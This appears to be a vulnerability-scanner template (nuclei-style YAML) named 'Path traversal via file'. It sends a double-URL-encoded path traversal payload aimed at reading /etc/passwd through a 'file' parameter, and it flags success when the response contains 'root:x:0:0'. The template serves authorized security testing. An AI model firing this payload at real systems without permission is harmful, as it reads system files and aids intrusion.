id: lfi-025
name: 'Path traversal via file'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/passwd via file'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - '..%252f..%252fetc%252fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
